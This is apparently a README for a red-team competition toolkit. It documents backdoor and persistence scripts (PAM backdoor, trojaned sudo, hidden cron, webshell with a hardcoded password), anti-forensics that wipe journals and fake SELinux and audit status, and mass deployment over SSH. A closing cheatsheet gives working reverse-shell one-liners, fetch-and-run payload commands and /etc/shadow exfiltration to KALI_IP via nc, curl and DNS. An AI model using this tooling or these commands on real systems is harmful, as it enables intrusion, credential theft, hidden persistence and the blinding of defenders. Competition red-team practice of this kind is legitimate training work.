# Tooling descriptions

## Map
```
├── mass-deploy.sh                     ← fan-out wrapper — deploy any tool to all Linux hosts at once
├── rt-ssh.sh                          ← SSH deployment wrapper (start here)
├── alias-bashrc.sh
├── break-net-tools.sh
├── compromise-w-who.sh
├── evil-timer
│   ├── deploy-evil-timer.sh
│   ├── poison-timer.sh
│   ├── python2-certbot.service
│   └── python2-certbot.timer
├── nuke-journal.sh
├── infinite-users.sh
├── lock-busybox.sh
├── no-apt.sh
├── no-audit.sh
├── no-selinux.sh
├── path-hijack.sh
├── persist
│   ├── ad_persist.sh
│   ├── linux_persist.sh
│   ├── redis_persist.sh
│   └── windows_persist.ps1
├── pam-backdoor
│   └── deploy-pam-backdoor.sh         ← self-contained (C source embedded)
├── pihole-github-sinkhole.sh
├── README.md
├── reconboard-v5
│   └── ...
├── shadow-crond.sh
├── sinkhole-scripts.sh
├── sudo-biNOry.sh
├── test-all-on-vm1.sh
├── the-toucher.sh
├── ureadahead-persist.sh
├── vandalize-bashrc.sh
├── vim-persist.sh
├── webshells
│   ├── deploy_lamp_shell.sh
│   ├── deploy_nginx_flask_shell.sh
│   └── shell.php
└── yay-install.sh
```

## Desc
| tool name | functionality |
| --- | --- |
| alias-bashrc.sh | searches for .bashrc files and injects a sudo() shell function that silently flushes nftables every time sudo is run, whether the user confirms or cancels — skips greyteam/ansible/scoring users |
| break-net-tools.sh | breaks curl, wget, and git via binary shadowing + proxy poisoning + shell function injection, all reversible, local git ops still work so scoring doesnt break — usage: `install\|remove\|status` |
| compromise-w-who.sh | backs up the `w` and `who` binaries then overwrites them with fakes, `w` shows hardcoded fake session data, `who` just says "better question is, where?" |
| evil-timer | poison-timer.sh is the real one — takes `--key "ssh-ed25519 ..."` to bake SSH key re-injection into the payload alongside firewall flush, SUID bash drop, and watchdog restarts; state saved to /var/cache/.syspkg/poison-timer.state so `remove` always targets exactly what was installed rather than re-guessing; all artefacts backdated 2020-04-15; deploy-evil-timer.sh deploys the python2-certbot user-level timer (no root) — usage: `install [--target <timer>] [--interval <min>] [--key "..."] \| remove \| status \| list` |
| nuke-journal.sh | kills journald logging entirely via Storage=none + RuntimeMaxUse=0 drop-ins, wipes all existing .journal files, shadows journalctl to report no entries and 0 disk usage, sets LogLevelMax=0 so nothing new is recorded — nothing survives; `wipe` sub-command can be called standalone to blast existing logs without touching the drop-ins — usage: `install\|remove\|status\|wipe` |
| infinite-users.sh | symlinks nologin to bash so any service account can get a shell, writes a sudoers.d entry giving all those accounts full nopasswd root, and sets a known password on every unlocked account so they're immediately SSHable — default password `rt2025!delta`, override with positional arg: `infinite-users 'mypass'` |
| lock-busybox.sh | replaces all busybox binaries with a gated wrapper — no token = segfault, red team uses RT_TOK=rt2025!delta or the hidden binary at /var/cache/.syspkg/busybox.real directly, also chmod 700s the shadow-crond copy so blue team cant call it — **must run AFTER shadow-crond.sh**; install now warns if shadow-crond (systemd-timesyncd-helper) isn't running before proceeding — usage: `install\|remove\|status` |
| no-apt.sh | renames sources.list and sources.list.d so apt-get silently breaks — idempotent, skips if already deployed — usage: `install\|remove\|status` |
| no-audit.sh | flushes all audit rules and disables kernel auditing with the real auditctl, then shadows it with a no-op wrapper so blue team cant add rules back, also redirects auditd log output to /dev/null and truncates rules.d — auditd stays "active (running)" the whole time — idempotent, skips if backup exists; `remove` restores auditctl, auditd.conf, and rules.d from /var/cache/.syspkg/ — usage: `install\|remove\|status` |
| no-selinux.sh | immediately sets permissive with the real setenforce, persists SELINUX=permissive in config, then shadows setenforce (no-op), getenforce (always says Enforcing), sestatus (full fake enforcing output), and semodule (no-op) — blue team sees enforcing but nothing is actually being enforced — idempotent, skips if backup exists; `remove` restores all four binaries and runs the real setenforce 1; `status` reads real enforcement via backup binary so it tells the truth — usage: `install\|remove\|status` |
| pam-backdoor | compiles pam_audit_log.so (looks like a legit audit stub) and prepends `auth sufficient` to /etc/pam.d/common-auth, lets you auth as any user with the magic password without touching real credentials; self-contained (C source embedded as heredoc, no companion .c needed); PAM dir detected via `find` on pam_unix.so (no python3 dependency); preflight checks gcc and libpam0g-dev headers; .so timestamped to match existing PAM modules; idempotent — usage: `install\|remove\|status` |
| pihole-github-sinkhole.sh | installs pihole unattended and sinkholes all github domains (github.com, githubusercontent.com, ghcr.io, etc) to 0.0.0.0, also poisons /etc/hosts as a backup layer |
| shadow-crond.sh | copies busybox to a hidden path so ps shows a system-looking name, runs busybox crond with a custom spool dir invisible to crontab -l, hides behind a systemd-timesyncd-helper service — edit /var/cache/.syspkg/tabs/root to change payload — **must run BEFORE lock-busybox.sh**; install now detects if the found busybox is the lock-busybox gated wrapper and automatically falls back to /var/cache/.syspkg/busybox.real — usage: `install\|remove\|status` |
| sinkhole-scripts.sh | sets up a dnsmasq sinkhole for any domain, defaults to pointing github.com at a dead ip, has install/remove/test |
| sudo-biNOry.sh | replaces /usr/bin/sudo with a wrapper that silently creates backdoor user `sudoer` (full nopasswd root) on first invocation, then passes through to the real sudo — real binary backed up to `/usr/bin/sudo.based`; `remove` restores original and deletes sudoer account — usage: `install\|remove\|status` |
| test-all-on-vm1.sh | test harness: runs every remote tool through pre-clean → install → status → remove on a single target and prints a PASS/WARN/FAIL receipt; useful for validating the toolkit against a fresh VM before competition — usage: `./test-all-on-vm1.sh [-t user@host] [-p pass] [-i keyfile]` |
| the-toucher.sh | runs as a background daemon (PID written to `/var/cache/.syspkg/toucher.pid`) that wanders the filesystem and randomly touches writable files every 0.1 s by default — corrupts mtimes, floods inotify watchers, breaks log rotation; never touches /proc /sys /dev — usage: `install [root] [delay] [max_depth] \| remove \| status` |
| vandalize-bashrc.sh | appends RT ASCII art to every `.bashrc` on the system (skips greyteam/ansible/scoring users), marked with `# rt-vandalize` sentinel so `remove` can strip it cleanly with sed — idempotent, skips already-vandalized files — usage: `install\|remove\|status` |
| vim-persist.sh | injects a vimscript autocmd into all .vimrc files that flushes iptables and nftables silently on every vim open, also hits /etc/vim/vimrc.local for system-wide coverage on users without a .vimrc — skips greyteam/ansible/scoring users, /etc/vim/vimrc.local respects the same whitelist |
| yay-install.sh | installs yay, probably doesnt work on ubuntu but whatever |
| ureadahead-persist.sh | persistence disguised as the `ureadahead` boot-prefetch service (real Ubuntu package in 14.04–20.04, removed in 22.04/24.04 — looks like an upgrade leftover), installs `/sbin/ureadahead` wrapper + hidden payload at `/lib/ureadahead/pack`, fires at boot + every 15 min via ExecStartPost loop, payload: SSH key injection into all homedirs, firewall flush, watchdog restart of shadow-crond — all artefacts backdated to 2020-04-15 — usage: `install [--key "..."] \| remove \| status` |
| path-hijack.sh | PATH directory injection — drops transparent command wrappers into a dir that lands first in `$PATH`; every time a user runs a hijacked command the wrapper re-asserts persistence silently then execs the real binary; three levels: **user** (`~/.local/bin` — already auto-prepended by Ubuntu 24.04's `~/.profile`, zero PATH modification, no root needed), **system** (`/etc/profile.d/10-update-manager.sh` drop-in for all users, disguised as real Ubuntu package), **cron** (prepends to `/etc/crontab` PATH to catch root cron jobs calling commands without full paths); payload levels 1–3: ssh-key / +suid-bash / +fw-flush+watchdogs — usage: `scan \| install [--level user\|system\|cron] [--key "..."] [--payload 1\|2\|3] \| remove \| status` |
| mass-deploy.sh | fan-out wrapper over rt-ssh.sh — fires one job per Linux host concurrently (default: all 9 at once), captures per-host output, prints a pass/fail summary table; host list baked in (internal IPs 10.10.10.101–109, Linux only); supports `--dry-run` to preview commands, `--hosts FILE` to override the target list, `-j N` to cap parallelism — see Mass Deployment section below |
| rt-ssh.sh | SSH deployment wrapper — base64-encodes each tool on Kali, SSHs to target, decodes into `/dev/shm` (RAM tmpfs, never touches disk), executes, wipes; no source code left on target machines; supports root SSH, sudo with/without password, and user-level (no sudo) modes — see Deployment section below |

### Deployment notes

- **shadow-crond.sh must run before lock-busybox.sh** — both scripts now enforce this in code: shadow-crond detects the lock-busybox wrapper (grep for RT_TOK) and falls back to `/var/cache/.syspkg/busybox.real`; lock-busybox warns at install time if shadow-crond isn't running; if you get the order wrong, the fix is `lock-busybox.sh remove → shadow-crond.sh install → lock-busybox.sh install`
- **nuke-journal.sh** — replaces flood-journal.sh; uses systemd drop-ins (`Storage=none`, `LogLevelMax=0`) instead of flooding workers so it's completely silent and leaves nothing to watch for; `wipe` subcommand can be called at any time to blast existing log files
- **poison-timer.sh apt-daily caveat** — apt-daily.timer is last in the auto-select list; if no-apt.sh ran first, apt-daily's ExecStart may fail and block ExecStartPost; man-db/logrotate/fstrim are preferred — this is enforced by candidate ordering in the script
- **idempotent scripts** — no-apt.sh, no-audit.sh, no-selinux.sh all exit early if already deployed; no-audit.sh and no-selinux.sh now also have `remove` and `status` subcommands matching the rest of the toolkit
- **shared hidden dir** — all scripts use `/var/cache/.syspkg/` for backups and binaries (chmod 700); poison-timer state is at `/var/cache/.syspkg/poison-timer.state`
- **pam-backdoor is now self-contained** — C source embedded as heredoc; PAM dir detected via `find` on pam_unix.so (no python3 dependency); gcc and libpam0g-dev headers checked before attempting compile
- **infinite-users + SSH key injection** — ureadahead-persist and poison-timer inject keys into ALL UID≥1000 home dirs including nologin-shelled accounts; after infinite-users runs those accounts have bash and the key is already there
- **password-only targets** — use `-p PASS` in rt-ssh.sh; this feeds both SSH login (via sshpass) and remote `sudo -S` from one flag; override sudo password separately with `-S` if needed

---

## Mass Deployment

`mass-deploy.sh` wraps `rt-ssh.sh` and fans out to all Linux hosts in parallel. Captures per-host output, prints it sequentially when all jobs finish, then prints a summary table. Exits non-zero if any host failed.

### Linux target list (internal IPs)

| Hostname | Internal IP |
|---|---|
| svc-ftp-01 | 10.10.10.101 |
| svc-redis-01 | 10.10.10.102 |
| svc-database-01 | 10.10.10.103 |
| svc-amazin-01 | 10.10.10.104 |
| svc-samba-01 | 10.10.10.105 |
| blue-ubnt-01 | 10.10.10.106 |
| blue-ubnt-02 | 10.10.10.107 |
| blue-ubnt-03 | 10.10.10.108 |
| blue-ubnt-04 | 10.10.10.109 |

Windows boxes (`svc-smb-01`, `svc-ad-01`, `blue-win-*`) are excluded — use the Windows persist scripts for those.

### mass-deploy.sh flags

```
./mass-deploy.sh [MASS-OPTS] <tool> [tool-args...]

  -u, --user USER      SSH username for all hosts (default: root)
  -p, --pass PASS      SSH password (forwarded to rt-ssh.sh -p)
  -i, --identity FILE  SSH private key (forwarded to rt-ssh.sh -i)
  -P, --port PORT      SSH port (default: 22)
  -S, --sudo-pass PASS Sudo password (forwarded to rt-ssh.sh -S)
      --no-sudo        Forward --no-sudo to rt-ssh.sh (use when SSH'd in as root)
  -j, --jobs N         Max parallel jobs (default: 9)
      --hosts FILE     Plain-text file of IPs to target (one per line); overrides built-in list
      --dry-run        Print the rt-ssh.sh command for each host without running it
  -v, --verbose        Forward -v to rt-ssh.sh (prints remote command on each host)
```

### Common usage

```bash
export RT_KEY="$(cat ~/.ssh/rt_ed25519.pub)"

# Dry-run first to confirm commands
./mass-deploy.sh --dry-run --no-sudo shadow-crond install

# Key auth, already root — shadow cron all Linux boxes
./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo shadow-crond install

# Password auth with sudo
./mass-deploy.sh -u ubuntu -p 'S3cr3t' shadow-crond install

# ureadahead + SSH key injection on all hosts
./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo ureadahead-persist install --key "$RT_KEY"

# Limit to 4 parallel jobs
./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo -j 4 path-hijack install --level system --key "$RT_KEY"

# Target a custom subset (plain IP list, one per line)
echo -e "10.10.10.101\n10.10.10.102" > /tmp/subset.txt
./mass-deploy.sh --hosts /tmp/subset.txt -i ~/.ssh/rt_ed25519 --no-sudo no-audit install
```

### Recommended mass deployment order

Same ordering constraints apply as single-host deployment — shadow-crond before lock-busybox:

```bash
export RT_KEY="$(cat ~/.ssh/rt_ed25519.pub)"
md() { ./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo "$@"; }

md shadow-crond install
md ureadahead-persist install --key "$RT_KEY"
md infinite-users
md path-hijack install --level system --key "$RT_KEY"
md path-hijack install --level cron   --key "$RT_KEY"
md pam-backdoor install
md lock-busybox install          # AFTER shadow-crond
md no-audit install
md no-selinux install
md poison-timer install --key "$RT_KEY"
md no-apt install
md break-net-tools install
```

### Check status across all hosts

```bash
for tool in shadow-crond ureadahead-persist lock-busybox pam-backdoor no-audit no-selinux path-hijack; do
    echo; echo "════ $tool ════"
    ./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo "$tool" status
done
```

---

## Deployment

All tools are deployed from Kali over SSH using `rt-ssh.sh`. Scripts are base64-encoded on Kali, piped to the target, decoded into `/dev/shm` (RAM — never written to actual disk), executed, and wiped. Source code never touches the target filesystem.

### Prerequisites

```bash
# on Kali — generate your deployment key if you don't have one
ssh-keygen -t ed25519 -f ~/.ssh/rt_ed25519 -N "" -C "rt-persist"
export RT_KEY="$(cat ~/.ssh/rt_ed25519.pub)"   # paste this into --key args below

# make everything executable
chmod +x mass-deploy.sh rt-ssh.sh *.sh evil-timer/*.sh pam-backdoor/*.sh persist/*.sh webshells/*.sh
```

### rt-ssh.sh flags

```
./rt-ssh.sh [OPTIONS] <tool> [tool-args...]

  -t, --target USER@HOST   SSH target (required for remote tools)
  -p, --pass PASS          SSH login password (uses sshpass); also used as sudo
                           password unless -S overrides it — use this for
                           password-only access (no key needed)
  -i, --identity FILE      SSH private key file
  -P, --port PORT          SSH port (default: 22)
  -S, --sudo-pass PASS     Sudo password override (if different from -p)
      --no-sudo            Don't prepend sudo (already SSH'd in as root)
  -v, --verbose            Print the remote command before running
      --list               List all available tools and exit
```

### Recommended deployment order (per host)

Two common starting points — pick based on what access you have.

#### Starting with password-only SSH (no key yet)

```bash
# Set once at the top of your session
export RT_KEY="$(cat ~/.ssh/id_ed25519.pub)"
HOST="192.168.241.150"
USER="user"      # SSH login user
PASS="user"      # SSH + sudo password (same in most CTF setups)

# -p handles both SSH auth (via sshpass) and sudo -S automatically
rt() { ./rt-ssh.sh -t "${USER}@${HOST}" -p "$PASS" "$@"; }

# 1. Scan for PATH hijack opportunities
rt path-hijack scan

# 2. Unlock all service accounts + set password (rt2025!delta by default)
#    After this, ssh as bin/daemon/www-data/etc. is possible
rt infinite-users

# 3. Shadow cron — must be BEFORE lock-busybox
rt shadow-crond install

# 4. ureadahead persistence (SSH key + fw flush + watchdogs at boot + every 15 min)
rt ureadahead-persist install --key "$RT_KEY"

# 5. PATH hijack user-level (no sudo, runs as $USER)
./rt-ssh.sh -t "${USER}@${HOST}" -p "$PASS" --no-sudo path-hijack-user install --level user --key "$RT_KEY"

# 6. PATH hijack system-wide + cron (root)
rt path-hijack install --level system --key "$RT_KEY"
rt path-hijack install --level cron   --key "$RT_KEY"

# 7. PAM backdoor — lets you auth as any user with rt2025!delta
rt pam-backdoor install

# 8. lock-busybox AFTER shadow-crond
rt lock-busybox install

# 9. anti-forensics
rt no-audit install
rt no-selinux install

# 10. timer persistence (re-injects SSH key + flushes FW every 10 min)
rt poison-timer install --key "$RT_KEY"

# 11. break blue team tooling
rt no-apt install
rt break-net-tools install
rt pihole-sinkhole install    # blocks GitHub/CDN
```

#### Starting with root SSH key (after initial foothold)

```bash
export RT_KEY="$(cat ~/.ssh/id_ed25519.pub)"
HOST="192.168.241.150"

# --no-sudo because we're already root
rt() { ./rt-ssh.sh -t "root@${HOST}" -i ~/.ssh/id_ed25519 --no-sudo "$@"; }

rt shadow-crond install
rt ureadahead-persist install --key "$RT_KEY"
rt infinite-users           # unlock service accounts (password: rt2025!delta)
# ... same steps 4–11 as above
```

### User-level tools (no sudo, run as SSH user)

These two run without sudo — systemd user units and ~/.local/bin PATH injection:

```bash
./rt-ssh.sh -t ubuntu@<host_ip> evil-timer install
./rt-ssh.sh -t ubuntu@<host_ip> path-hijack-user install --level user --key "$RT_KEY"
```

### Local tools (run on Kali, target the host via SSH/HTTP/Redis)

These scripts manage the target directly without the `rt-ssh.sh` pipe — they handle their own connections:

```bash
# Linux host — SSH key + cron + systemd user service + SUID bash + .bashrc
./persist/linux_persist.sh <target_ip> <user> <pass> <lhost> <lport>

# Redis host — unauthenticated Redis → SSH key + cron.d write
./persist/redis_persist.sh <target_ip>

# AD (post-DA) — golden ticket + backdoor DA + AdminSDHolder + DNS
./persist/ad_persist.sh <dc_ip> <domain.local> Administrator <pass> <lhost>

# Windows — scheduled task + reg Run + WMI event sub + VBS startup + hidden service
#   powershell -ep bypass -File persist/windows_persist.ps1 -LHost <lhost> -LPort 4446

# Webshells
./webshells/deploy_lamp_shell.sh  <target_ip> guest ""
./webshells/deploy_nginx_flask_shell.sh <target_ip> 80 6379 <lhost>
```

### Check status across tools

```bash
TARGET="root@<host_ip>"
for tool in shadow-crond nuke-journal ureadahead-persist lock-busybox poison-timer pam-backdoor no-audit no-selinux path-hijack; do
    echo "=== $tool ==="
    ./rt-ssh.sh -t $TARGET $tool status 2>/dev/null || true
done
```

### Secrets

| Secret | Default | Used by |
|--------|---------|---------|
| RT token | `rt2025!delta` | busybox gate (`RT_TOK`), PAM backdoor, PHP webshell, infinite-users account password |
| SSH key | generate per op | ureadahead-persist, poison-timer, path-hijack, linux_persist |

**Change both before deployment** — especially if competing teams can read each other's tooling.

```bash
# find every hardcoded token and replace before deployment
grep -r "rt2025!delta" odessa/ --include="*.sh" --include="*.php" --include="*.c" -l
```

## TODO
- Multiple ssh binaries running on different ports
- 20 Docker binaries all running as hidden services

---

## persist/ — Deep Persistence Scripts

| Script | Targets | Methods |
|--------|---------|---------|
| `persist/linux_persist.sh` | svc-ftp-01, svc-redis-01, svc-database-01, svc-amazin-01, svc-samba-01 | SSH authorized_keys, cron, systemd service, SUID bash copy, .bashrc hook |
| `persist/redis_persist.sh` | svc-redis-01, svc-database-01 | Redis RDB write → SSH key injection + /etc/cron.d write |
| `persist/windows_persist.ps1` | svc-ad-01, svc-smb-01 | Scheduled task (SYSTEM), reg Run key, WMI event sub, startup folder VBS, hidden service |
| `persist/ad_persist.sh` | svc-ad-01 | DCSync, golden ticket, backdoor Domain Admin, AdminSDHolder ACL, DNS record injection |

```bash
# Linux (any Ubuntu host)
./persist/linux_persist.sh <target_ip> <user> <pass> <lhost> <lport>

# Redis (unauthenticated open Redis)
./persist/redis_persist.sh <target_ip>

# AD (after getting DA creds)
./persist/ad_persist.sh <dc_ip> <domain.local> Administrator <pass> <lhost>

# Windows (run on a PS shell on target, or via CrackMapExec -X)
#   powershell -ep bypass -File persist/windows_persist.ps1 -LHost <lhost> -LPort 4446
```

## webshells/ — Webshell Deployers

| Script | Target | Technique |
|--------|--------|-----------|
| `webshells/shell.php` | WP/LAMP hosts | Feature-rich PHP webshell (cmd / upload / read / revshell) |
| `webshells/deploy_lamp_shell.sh` | svc-samba-01 (LAMP) | Samba→webroot write, LFI+log poisoning, PHPMyAdmin SELECT INTO OUTFILE |
| `webshells/deploy_nginx_flask_shell.sh` | svc-redis-01 (Flask/Nginx) | Jinja2 SSTI→RCE, Redis session forgery, Nginx alias traversal, Werkzeug debug console |

```bash
chmod +x webshells/*.sh persist/*.sh

# LAMP
./webshells/deploy_lamp_shell.sh <target_ip> guest ""

# Flask/Nginx
./webshells/deploy_nginx_flask_shell.sh <target_ip> 80 6379 <lhost>
```

### shell.php quick ref (password: `rt2025!delta` — change before use)

| Action | URL |
|--------|-----|
| Command | `?p=rt2025!delta&c=id` |
| Read file | `?p=rt2025!delta&act=read&f=/etc/passwd` |
| Upload | `POST ?p=rt2025!delta&act=upload` |
| Rev shell | `?p=rt2025!delta&act=revshell&rh=LHOST&rp=4444` |

---

## Cheatsheet — Exfil / Drop Files / Run Commands

### Run commands on a remote host

```bash
# rt-ssh.sh (recommended — no trace on disk)
./rt-ssh.sh -t root@TARGET --no-sudo shadow-crond status

# plain SSH one-liner
ssh root@TARGET 'id; hostname; cat /etc/passwd'

# sshpass (password auth)
sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no user@TARGET 'id'

# via webshell
curl 'http://TARGET/shell.php?p=rt2025!delta&c=id'

# via cron (already installed shadow-cron spool)
echo '* * * * * root id > /tmp/out' >> /var/cache/.syspkg/tabs/root

# via PAM (once backdoor is installed — any user, any shell)
ssh ANY_USER@TARGET   # password: rt2025!delta
```

### Drop files on a remote host

```bash
# SCP (key auth)
scp -i ~/.ssh/rt_ed25519 payload.sh root@TARGET:/tmp/

# SCP (password auth via sshpass)
sshpass -p 'PASS' scp payload.sh user@TARGET:/tmp/

# base64 over SSH (no SCP binary needed; lands in RAM)
base64 -w0 payload.sh | ssh root@TARGET \
  'base64 -d > /dev/shm/.x; chmod 700 /dev/shm/.x; /dev/shm/.x; rm -f /dev/shm/.x'

# curl from your Kali HTTP server
ssh root@TARGET 'curl -so /tmp/p http://KALI_IP:8080/payload.sh && bash /tmp/p'

# wget equivalent
ssh root@TARGET 'wget -qO /tmp/p http://KALI_IP:8080/payload.sh && bash /tmp/p'

# via PHP webshell upload
curl -F "file=@payload.sh" 'http://TARGET/shell.php?p=rt2025!delta&act=upload'

# Python HTTP server on Kali (serve current dir)
python3 -m http.server 8080
```

### Exfiltrate data from a remote host

```bash
# SCP pull (key auth)
scp -i ~/.ssh/rt_ed25519 root@TARGET:/etc/shadow ./loot/

# SCP pull (password)
sshpass -p 'PASS' scp user@TARGET:/etc/shadow ./loot/

# SSH + tar (entire directory, no intermediate file)
ssh root@TARGET 'tar czf - /etc/' > loot/etc.tar.gz

# SSH + base64 (single file, no SCP)
ssh root@TARGET 'base64 /etc/shadow' | base64 -d > loot/shadow

# curl POST to Kali listener (from target — if net is open)
# on Kali: nc -lvnp 9001 > loot/passwd
ssh root@TARGET 'curl -s -X POST --data-binary @/etc/passwd http://KALI_IP:9001'

# nc pipe (if nc with -e or openbsd nc available on target)
# on Kali: nc -lvnp 9001 > loot/passwd
ssh root@TARGET 'nc KALI_IP 9001 < /etc/passwd'

# DNS exfil (slow, bypasses HTTP blocks — xxd + dig)
ssh root@TARGET \
  'xxd -p /etc/passwd | tr -d "\n" | fold -w 60 | \
   while read c; do dig +short "${c}.exfil.KALI_DOMAIN" @KALI_IP; done'

# via webshell read
curl 'http://TARGET/shell.php?p=rt2025!delta&act=read&f=/etc/shadow'

# rsync (if available)
rsync -avz -e "ssh -i ~/.ssh/rt_ed25519" root@TARGET:/var/log/ ./loot/logs/
```

### Establish a reverse shell

```bash
# bash TCP
bash -i >& /dev/tcp/KALI_IP/4444 0>&1

# python3
python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect(('KALI_IP',4444)); \
  os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])"

# via webshell
curl 'http://TARGET/shell.php?p=rt2025!delta&act=revshell&rh=KALI_IP&rp=4444'

# ncat (if ncat/nc on target)
ncat KALI_IP 4444 -e /bin/bash

# socat (full PTY)
# on Kali: socat file:`tty`,raw,echo=0 tcp-listen:4444
socat exec:/bin/bash,pty,setsid,sigint,sane tcp:KALI_IP:4444
```
